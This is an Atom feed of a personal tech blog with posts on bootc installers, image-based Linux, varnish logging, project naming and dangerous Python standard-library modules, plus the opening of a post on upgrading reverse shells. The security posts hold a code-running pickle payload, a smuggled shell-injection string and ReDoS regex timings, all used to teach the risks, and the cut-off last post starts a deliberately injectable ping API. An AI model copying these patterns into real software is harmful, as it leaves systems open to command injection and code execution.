<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>supakeen's weblog</title><link href="https://supakeen.com/weblog/" rel="alternate"></link><link href="https://supakeen.com/weblog/feeds/all.atom.xml" rel="self"></link><id>https://supakeen.com/weblog/</id><updated>2024-09-13T12:00:00+02:00</updated><entry><title>Building an Interactive Installer for bootc</title><link href="https://supakeen.com/weblog/building-interactive-installer-bootc.html" rel="alternate"></link><published>2024-09-13T12:00:00+02:00</published><updated>2024-09-13T12:00:00+02:00</updated><author><name>supakeen</name></author><id>tag:supakeen.com,2024-09-13:/weblog/building-interactive-installer-bootc.html</id><summary type="html">&lt;p class="first last"&gt;Building an Interactive Installer for bootc&lt;/p&gt;
</summary><content type="html">&lt;p&gt;A question popped up today on the #bootc:fedoraproject.org Matrix channel on
how to create an interactive installer for a bootable container. This is a quick
write up of how to use some details in &lt;a class="reference external" href="https://github.com/osbuild/bootc-image-builder"&gt;bootc-image-builder&lt;/a&gt; to generate an
interactive &lt;a class="reference external" href="https://docs.fedoraproject.org/en-US/quick-docs/anaconda-introduction/"&gt;Anaconda&lt;/a&gt; ISO.&lt;/p&gt;
&lt;p&gt;You can provide &lt;a class="reference external" href="https://github.com/osbuild/bootc-image-builder?tab=readme-ov-file#anaconda-iso-installer-options-installer-mapping"&gt;custom kickstarts&lt;/a&gt; in &lt;cite&gt;bootc-image-builder&lt;/cite&gt;. The README
mentions that:&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Note that bootc-image-builder will automatically add the command that installs the container image (`ostreecontainer` ...), so this line or any line that conflicts with it should not be included. See the relevant Kickstart documentation for more information. No other kickstart commands are added by bootc-image-builder in this case, so it is the responsibility of the user to provide all other commands (for example, for partitioning, network, language, etc).&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;This implies that if we provide an empty custom kickstart we will end up with
an incomplete kickstart containing only the &lt;cite&gt;ostreecontainer&lt;/cite&gt; directive:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# see https://github.com/osbuild/bootc-image-builder?tab=readme-ov-file#anaconda-iso-installer-options-installer-mapping&lt;/span&gt;
&lt;span class="k"&gt;[customizations.installer.kickstart]&lt;/span&gt;
&lt;span class="n"&gt;contents&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And then build an ISO:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo podman run \
    --rm \
    -it \
    --privileged \
    --pull=newer \
    --security-opt label=type:unconfined_t \
    -v $(pwd)/config.toml:/config.toml:ro \
    -v $(pwd)/output:/output \
    quay.io/centos-bootc/bootc-image-builder:latest \
    --type anaconda-iso \
    quay.io/centos-bootc/centos-bootc:stream9
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This will put Anaconda into interactive mode so the user can provide the missing
information. You can also enable &lt;a class="reference external" href="https://github.com/osbuild/bootc-image-builder?tab=readme-ov-file#anaconda-iso-installer-modules"&gt;extra modules&lt;/a&gt; for Anaconda though I haven't
tried so myself.&lt;/p&gt;
&lt;img alt="" src="anaconda-bootc.png" /&gt;
&lt;p&gt;Note that you will need to create partitions and label &lt;cite&gt;/boot&lt;/cite&gt; as
&lt;cite&gt;boot&lt;/cite&gt; so the installed system can find its boot partition.&lt;/p&gt;
</content><category term="linux"></category><category term="os"></category><category term="bootc"></category><category term="anaconda"></category></entry><entry><title>What is Image Based Linux?</title><link href="https://supakeen.com/weblog/what-is-image-based-linux.html" rel="alternate"></link><published>2023-08-09T12:00:00+02:00</published><updated>2023-08-09T12:00:00+02:00</updated><author><name>supakeen</name></author><id>tag:supakeen.com,2023-08-09:/weblog/what-is-image-based-linux.html</id><summary type="html">&lt;p class="first last"&gt;What is Image Based Linux?&lt;/p&gt;
</summary><content type="html">&lt;p&gt;In operating system land things are always changing. You might have heard about
image based distributions such as &lt;a class="reference external" href="https://www.endlessos.org/"&gt;Endless OS&lt;/a&gt;, &lt;a class="reference external" href="https://fedoraproject.org/iot/"&gt;Fedora IoT&lt;/a&gt;,
&lt;a class="reference external" href="https://www.redhat.com/en/technologies/linux-platforms/enterprise-linux/edge-computing)"&gt;RHEL for Edge&lt;/a&gt;, &lt;a class="reference external" href="https://ubuntu.com/core"&gt;Ubuntu Core&lt;/a&gt; and others. Perhaps you've heard other terms
such as &lt;a class="reference external" href="https://uapi-group.org/specifications/specs/unified_kernel_image/"&gt;Unified Kernel Images&lt;/a&gt; (UKI) or &lt;a class="reference external" href="https://uapi-group.org/specifications/specs/discoverable_disk_image/"&gt;Discoverable Disk Images&lt;/a&gt; (DDI) and
wondered what that's about. Let's get into what image based Linux is and what its
possible benefits are to you.&lt;/p&gt;
&lt;p&gt;This post is the introduction part to a series I'm writing about image based Linux
systems, their advantages and disadvantages and how to build and test them.&lt;/p&gt;
&lt;p&gt;Before we get started on the difference let me describe a more traditional
package based Linux distribution. You install it from an ISO and update packages
with that distributions package manager. If you have a lot of machines it might
be difficult to track which state they are in. They all have different packages
installed and are perhaps in different states regarding the updates they've
installed and when they've last rebooted to use a new kernel.&lt;/p&gt;
&lt;p&gt;With an image based distribution the system as a whole is built and updated as
a single thing. A system being on a certain version means you know the state of
everything on the system.&lt;/p&gt;
&lt;p&gt;Image based distributions are useful in situations where you run many machines
in many locations, often called the 'device edge'. Think of a factory full of
single board computers that collect sensor data. Point-of-sale systems.
Information screens. Cars. Places where it isn't immediately feasible to send
an engineer if something breaks. Image based distributions are also finding
their place in the mobile market.&lt;/p&gt;
&lt;p&gt;Running a normal distribution on these sorts of systems makes it hard to test
the system before deploying updates. Image based distributions often support a
form of A/B booting and monitored boot. This means that they can roll back from
a broken update to a previously known good image.&lt;/p&gt;
&lt;p&gt;Image based distributions often have a focus on providing easy provisioning of
devices through things such as &lt;a class="reference external" href="https://fidoalliance.org/specs/FDO/FIDO-Device-Onboard-RD-v1.0-20201202.html"&gt;FDO&lt;/a&gt; or &lt;a class="reference external" href="https://coreos.github.io/ignition/"&gt;Ignition&lt;/a&gt;. Try to provide a secure
physical environment through dm/fsverity, secure boot, TPMs, and UKI. And a
solid update cycle that can always restore to a previous state. Don't worry if
you're not yet familiar with this forest of abbreviations and concepts, these will
be the subjects of followup posts.&lt;/p&gt;
&lt;p&gt;In the next post I'll talk about the ways disk contents are managed in image based
distributions. This is one of the important considerations that sets apart an image
based distribution from a traditional one.&lt;/p&gt;
</content><category term="linux"></category><category term="os"></category><category term="image-based"></category></entry><entry><title>A varnishncsa logfile per host</title><link href="https://supakeen.com/weblog/varnishncsa-per-host.html.html" rel="alternate"></link><published>2020-04-25T12:00:00+02:00</published><updated>2020-04-25T12:00:00+02:00</updated><author><name>supakeen</name></author><id>tag:supakeen.com,2020-04-25:/weblog/varnishncsa-per-host.html.html</id><summary type="html">&lt;p class="first last"&gt;How to configure varnishncsa logging per host.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;a class="reference external" href="https://varnish-cache.org/"&gt;Varnish&lt;/a&gt; is a caching proxy server in quite widespread use. Its common role is
to set in between your load balancer and web servers to lessen the requests
ending up at the latter.&lt;/p&gt;
&lt;p&gt;A often recurring situation is that your Varnish instance serves multiple
different hostnames. If you want to use some of the older tools such as
&lt;a class="reference external" href="http://www.webalizer.org/"&gt;Webalizer&lt;/a&gt; or &lt;a class="reference external" href="https://awstats.sourceforge.io/"&gt;awstats&lt;/a&gt; to process your logs you probably need a log file per
hostname.&lt;/p&gt;
&lt;p&gt;For this we can use &lt;cite&gt;varnishncsa&lt;/cite&gt; a utility that comes with Varnish to
retrieve logfiles. This post was written with Ubuntu 18.04 as a base system
but should work on your system even if you might have to change some paths.&lt;/p&gt;
&lt;p&gt;Normally a &lt;cite&gt;varnishncsa.service&lt;/cite&gt; file is created for &lt;cite&gt;systemd&lt;/cite&gt; to run a
default instance of it, these logs end up in &lt;cite&gt;/var/log/varnish&lt;/cite&gt;. We're going
to add our own parametrized service files that filter out specific hostnames.&lt;/p&gt;
&lt;p&gt;Note that you will end up running multiple instances of &lt;cite&gt;varnishncsa&lt;/cite&gt;, this
hasn't been a problem for me as they are quite lightweight.&lt;/p&gt;
&lt;p&gt;Let's get started.&lt;/p&gt;
&lt;div class="section" id="setup"&gt;
&lt;h2&gt;Setup&lt;/h2&gt;
&lt;p&gt;Start by creating a new service file in &lt;cite&gt;/lib/systemd/system&lt;/cite&gt; under the name
&lt;cite&gt;varnishncsa-per-host&amp;#64;.service&lt;/cite&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# cat /lib/systemd/system/varnishncsa-per-host\@.service
[Unit]
Description=Varnish HTTP accelerator log daemon for Host %I
Documentation=https://supakeen.com/weblog/varnishncsa-per-host.html
After=varnish.service

[Service]
Type=forking
PIDFile=/run/varnishncsa/varnishncsa-%I.pid
RuntimeDirectory=varnishncsa
User=varnishlog
Group=varnish
ExecStart=/usr/bin/varnishncsa -a -q &amp;quot;ReqHeader ~ &amp;#39;^Host: %I&amp;#39;&amp;quot; -w /var/log/varnish/varnishncsa-%I.log -D -P /run/varnishncsa/varnishncsa-%I.pid
ExecReload=/bin/kill -HUP $MAINPID
PrivateDevices=true
PrivateNetwork=true
PrivateTmp=true
ProtectHome=true
ProtectSystem=full

[Install]
WantedBy=multi-user.target
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;In this file you see multiple &lt;cite&gt;%I&lt;/cite&gt; format specifiers. These will be replaced
by &lt;cite&gt;systemd&lt;/cite&gt;. We are using &lt;cite&gt;varnishncsa&lt;/cite&gt;'s filtering on the &lt;cite&gt;Host&lt;/cite&gt; header
to find only the host we're interested in.&lt;/p&gt;
&lt;p&gt;After we've created this file we can now create symlinks to enable this service
for a hostname. Repeat this step per Host header you want to filter out.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# ln -s /lib/systemd/system/varnishncsa-per-host\@.service ./varnishncsa-per-host@supakeen.com.service
# systemctl daemon-reload
# systemctl enable varnishncsa-per-host@supakeen.com.service
# systemctl start varnishncsa-per-host@supakeen.com.service
# systemctl status varnishncsa-per-host@supakeen.com.service
● varnishncsa-per-host@supakeen.com.service - Varnish HTTP accelerator log daemon for Host supakeen.com
   Loaded: loaded (/lib/systemd/system/varnishncsa-per-host@.service; indirect; vendor preset: enabled)
   Active: active (running) since Sat 2020-04-25 09:26:34 UTC; 18min ago
     Docs: https://supakeen.com/weblog/varnishncsa-per-host.html
 Main PID: 20822 (varnishncsa)
    Tasks: 1 (limit: 1151)
   CGroup: /system.slice/system-varnishncsa\x2dper\x2dhost.slice/varnishncsa-per-host@supakeen.com.service
           └─20822 /usr/bin/varnishncsa -a -q ReqHeader ~ &amp;#39;^Host: supakeen.com&amp;#39; -w /var/log/varnish/varnishncsa-supakeen.com.log -D -P /run/varnishncsa/varnishncsa-supakeen.com.pid

Apr 25 09:26:34 var.tty.cat systemd[1]: Starting Varnish HTTP accelerator log daemon for Host supakeen.com...
Apr 25 09:26:34 var.tty.cat systemd[1]: varnishncsa-per-host@supakeen.com.service: Failed to parse PID from file /run/varnishncsa/varnishncsa-supakeen.com.pid: Invalid argument
Apr 25 09:26:34 var.tty.cat systemd[1]: Started Varnish HTTP accelerator log daemon for Host supakeen.com.
root@var:~#
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And a new file now shows up in &lt;cite&gt;/var/log/varnish&lt;/cite&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# stat /var/log/varnish/varnishncsa-supakeen.com.log
  File: /var/log/varnish/varnishncsa-supakeen.com.log
  Size: 1946            Blocks: 8          IO Block: 4096   regular file
Device: fc01h/64513d    Inode: 260830      Links: 1
Access: (0644/-rw-r--r--)  Uid: (  113/varnishlog)   Gid: (  115/ varnish)
Access: 2020-04-25 09:26:34.904152413 +0000
Modify: 2020-04-25 09:34:43.891850255 +0000
Change: 2020-04-25 09:34:43.891850255 +0000
 Birth: -
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;That's it! You can now use this file any way you want. Good luck.&lt;/p&gt;
&lt;/div&gt;
</content><category term="configuration"></category><category term="varnish"></category><category term="configuration"></category></entry><entry><title>How to name a project?</title><link href="https://supakeen.com/weblog/how-to-name-a-project.html" rel="alternate"></link><published>2020-04-06T12:00:00+02:00</published><updated>2020-04-06T12:00:00+02:00</updated><author><name>supakeen</name></author><id>tag:supakeen.com,2020-04-06:/weblog/how-to-name-a-project.html</id><summary type="html">&lt;p class="first last"&gt;A strategy for naming projects.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;There's only two things hard about computers, naming things is one of them. We
think for ages and sometimes it might put us off doing something entirely. This
is especially annoying if it's a project name!&lt;/p&gt;
&lt;p&gt;When I worked at a design agency a very long time ago I noticed that they had a
specific way of naming brands. Something I've since forgotten the name of but
still roughly remember the methodology. A methodology I use for naming all my
projects, even if their names might say otherwise.&lt;/p&gt;
&lt;p&gt;Think about your project. What does it do? Write down a few words that remind
you of what the project does or what the project name should say. Maybe your
words are:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Fast&lt;/li&gt;
&lt;li&gt;Speed&lt;/li&gt;
&lt;li&gt;Small&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Now for each of these words we will do the same, think of a few words for each
of the chosen words that remind you of those words.&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Cheetah (Fast)&lt;/li&gt;
&lt;li&gt;Race (Fast)&lt;/li&gt;
&lt;li&gt;Bolt (Fast)&lt;/li&gt;
&lt;li&gt;Wind (Speed)&lt;/li&gt;
&lt;li&gt;Noise (Speed)&lt;/li&gt;
&lt;li&gt;Car (Speed)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We can repeat this process another time, I usually do this until I'm at least
two removed from the original list of words. You'll have a huge list of words
and it's time to start striking away at those words you don't like or the
feeling you get thinking about that word.&lt;/p&gt;
&lt;p&gt;You can then make combinations between those words, pick words directly, or
use the words from different languages as your choice of project name. For fun
let's do a few with the words above:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;racecar&lt;/li&gt;
&lt;li&gt;cheet&lt;/li&gt;
&lt;li&gt;bolty&lt;/li&gt;
&lt;/ul&gt;
</content><category term="howto"></category><category term="auxiliary"></category></entry><entry><title>Dangers in Python's standard library</title><link href="https://supakeen.com/weblog/dangers-in-pythons-standard-library.html" rel="alternate"></link><published>2019-01-16T12:00:00+01:00</published><updated>2019-01-16T12:00:00+01:00</updated><author><name>supakeen</name></author><id>tag:supakeen.com,2019-01-16:/weblog/dangers-in-pythons-standard-library.html</id><summary type="html">&lt;p class="first last"&gt;Things to be wary of when using Python's standard library.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;The Python programming language comes with &amp;quot;Batteries Included&amp;quot;. A philosophy
to ship a comprehensive, immediately-useful standard library. However, since
the standard library comes with Python it is hard to refactor for older code
depends on it. Because of this the standard library can in many cases lag quite
far behind what is available in the ecosystem as a whole.&lt;/p&gt;
&lt;p&gt;Some of the Python standard library is downright dangerous. By dangerous I mean
that special care has to be taken when using certain functions. This article
highlights some of the more well-known issues with the standard library, but is
by no means a comprehensive list of everything that can go wrong, nor a claim
that the Python standard library is bad.&lt;/p&gt;
&lt;p&gt;This article is only about modules in the standard library; dangerous syntax,
types, and other language abilities are saved for another day. As always, pay
attention and try to think 'what does this actually do and can it be used in
a different way'.&lt;/p&gt;
&lt;p&gt;Don't consider this to be a definitive list at any point in time. The initial
listed modules are popularly used.&lt;/p&gt;
&lt;div class="section" id="pickle"&gt;
&lt;h2&gt;pickle&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="https://docs.python.org/3/library/pickle.html#module-pickle"&gt;Pickle&lt;/a&gt; is a module in Python land to serialize 'arbitrary' objects. It is
often used when someone needs an easy way to send an objects' state elsewhere.&lt;/p&gt;
&lt;p&gt;The Pickle module has many pitfalls. One of them is the fact that Pickled data
is meant to run on only the same Python version, and while it might sometimes
work on different versions (Pickle has a notion of a protocol version) its
interoperability leaves some things to be desired.&lt;/p&gt;
&lt;p&gt;More damning is the fact that loading Pickled data allows for arbitrary code
execution. If you load Pickled data from sources you cannot trust -- something
much harder to guarantee than it might seem -- it is woeful. This combined
with the fact that a serialization format has interoperability issues should be
enough to steer well clear of it.&lt;/p&gt;
&lt;p&gt;See the following example of unpickling some data, causing it to print
&lt;tt class="docutils literal"&gt;hello&lt;/tt&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;pickle&lt;/span&gt;

&lt;span class="n"&gt;pickle&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;loads&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x80\x03&lt;/span&gt;&lt;span class="s1"&gt;cbuiltins&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;print&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;q&lt;/span&gt;&lt;span class="se"&gt;\x00&lt;/span&gt;&lt;span class="s1"&gt;X&lt;/span&gt;&lt;span class="se"&gt;\x05\x00\x00\x00&lt;/span&gt;&lt;span class="s1"&gt;helloq&lt;/span&gt;&lt;span class="se"&gt;\x01\x85&lt;/span&gt;&lt;span class="s1"&gt;q&lt;/span&gt;&lt;span class="se"&gt;\x02&lt;/span&gt;&lt;span class="s1"&gt;Rq&lt;/span&gt;&lt;span class="se"&gt;\x03&lt;/span&gt;&lt;span class="s1"&gt;.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# hello&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If you do ever need to exchange data, use a format that does not allow for any
'clever' things. A good option is to use JSON, which is available in the standard
library. You would need to write some code to explicitly convert your objects
to a format you are happy with, and some code to explicitly convert some
serialized data back to your objects.&lt;/p&gt;
&lt;p&gt;There are libraries to help you with this such as &lt;a class="reference external" href="https://marshmallow.readthedocs.io/"&gt;marshmallow&lt;/a&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="os-system-subprocess"&gt;
&lt;h2&gt;os.system, subprocess&lt;/h2&gt;
&lt;p&gt;&lt;tt class="docutils literal"&gt;os.system&lt;/tt&gt; is inherently not safe with any user input and is likely not a
function you want to ever use due to its working. You would want to use the
&lt;tt class="docutils literal"&gt;subprocess.*&lt;/tt&gt; functions and those come with a &lt;a class="reference external" href="https://supakeen.com/weblog/0x01.html"&gt;manual&lt;/a&gt; to use securely.&lt;/p&gt;
&lt;p&gt;Seriously scrutinize any use of these classes of functions as they lead to
mistakes, most of which are easy to turn against you.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="shlex"&gt;
&lt;h2&gt;shlex&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="https://docs.python.org/3/library/shlex.html#module-shlex"&gt;shlex&lt;/a&gt; was a suggestion of mine in one of my previous articles. It is however
commonly used improperly. Consider if the following is the splitting you want:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;shlex&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;subprocess&lt;/span&gt;

&lt;span class="n"&gt;user_input&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;shlex&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;foo;echo$&lt;/span&gt;&lt;span class="si"&gt;{IFS}&lt;/span&gt;&lt;span class="s2"&gt;hello&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;command&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;echo &lt;/span&gt;&lt;span class="si"&gt;{}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user_input&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;subprocess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;check_output&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;command&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# b&amp;#39;foo\nhello\n&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The above shows a mismatch between what shlex thinks are separators for a shell
and what the actual outcome is. Someone less familiar with shlex might
assume that a shlex split always makes sure only a single argument is possible.&lt;/p&gt;
&lt;p&gt;shlex can give a false sense of security if you are not absolutely certain you
know how shells work and what is in your input. Since you can never be certain
of the latter, you should prefer to work around having to use it.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="re"&gt;
&lt;h2&gt;re&lt;/h2&gt;
&lt;p&gt;Regular expressions, you think you know them and now you have two problems.
While a powerful language that likely doesn't lead to direct exploitation one
does have to take care when writing these.&lt;/p&gt;
&lt;p&gt;A possible attack is a denial of service by turning your own regular
expressions against you. Note the timings below.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;import re;re.match(&amp;#39;^(a+)+$&amp;#39;, &amp;#39;&lt;/span&gt;&lt;span class="si"&gt;{}&lt;/span&gt;&lt;span class="s2"&gt;!&amp;#39;)&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;a&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="mf"&gt;1.4856852590019116&lt;/span&gt;
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;import re;re.match(&amp;#39;^(a+)+$&amp;#39;, &amp;#39;&lt;/span&gt;&lt;span class="si"&gt;{}&lt;/span&gt;&lt;span class="s2"&gt;!&amp;#39;)&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;a&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="mf"&gt;40.852224354999635&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="xml"&gt;
&lt;h2&gt;xml&lt;/h2&gt;
&lt;p&gt;XML, or eXtensible Markup Language is a format commonly (or less commonly
in current times) used to exchange data between different systems or for
general data serialization. XML is extremely flexible with a lot of knobs, this
has also led to a large amount of flaws possible in certain implementations.&lt;/p&gt;
&lt;p&gt;This is well documented at the Python documentation website on &lt;a class="reference external" href="https://docs.python.org/3/library/xml.html#module-xml"&gt;xml&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The excellent &lt;a class="reference external" href="https://pypi.org/project/defusedxml/"&gt;defusedxml&lt;/a&gt; package written by Christian Heimes has an amazing
README explaining all the issues, and has patches to make the standard Python
libraries and some other libraries less vulnerable. Read the description on
PyPI.&lt;/p&gt;
&lt;p&gt;Any use of the built-in xml libraries should be scrutinized and where possible
be replaced with &lt;a class="reference external" href="https://lxml.de/"&gt;lxml&lt;/a&gt;. lxml is a binding to libxml2 which comes with generally
secure defaults and a network sandbox.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="random"&gt;
&lt;h2&gt;random&lt;/h2&gt;
&lt;p&gt;The default &lt;a class="reference external" href="https://docs.python.org/3/library/random.html"&gt;random&lt;/a&gt; module in Python will use a predictable random number
generator. If you use it for anything that is supposed to be secret please
use the &lt;a class="reference external" href="https://docs.python.org/3/library/secrets.html"&gt;secrets&lt;/a&gt; module or &lt;tt class="docutils literal"&gt;random.SystemRandom()&lt;/tt&gt;.&lt;/p&gt;
&lt;p&gt;It is a good idea to always use &lt;tt class="docutils literal"&gt;secrets&lt;/tt&gt; or &lt;tt class="docutils literal"&gt;SystemRandom&lt;/tt&gt; unless you are
certain you don't need it, instead of assuming the reverse.&lt;/p&gt;
&lt;/div&gt;
</content><category term="python"></category><category term="python"></category><category term="stdlib"></category></entry><entry><title>Upgrading a reverse shell?</title><link href="https://supakeen.com/weblog/upgrading-a-reverse-shell.html" rel="alternate"></link><published>2018-09-08T12:00:00+02:00</published><updated>2018-09-08T12:00:00+02:00</updated><author><name>supakeen</name></author><id>tag:supakeen.com,2018-09-08:/weblog/upgrading-a-reverse-shell.html</id><summary type="html">&lt;p class="first last"&gt;Some notes on gaining and upgrading reverse shells.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;You've found a reverse shell but it's not behaving like a proper shell. You
can't run &lt;cite&gt;su&lt;/cite&gt; because it requires a tty and you might not have a prompt. This
is my quick summary on my notes on upgrading a reverse shell to something
useful. If you want other ways (and this way is included) read the canonical
&lt;a class="reference external" href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/"&gt;ropnop&lt;/a&gt; article as well.&lt;/p&gt;
&lt;p&gt;Let's start with an easy and vulnerable application: a &lt;cite&gt;ping&lt;/cite&gt; API. If you've
read my previous post you know that there is a command injection in this
script.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Do not run scripts like these on your own machine as they are insecure.&lt;/strong&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;tornado.web&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;tornado.ioloop&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;subprocess&lt;/span&gt;


&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;PingAsAService&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tornado&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;web&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;RequestHandler&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;host&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_query_argument&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;host&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
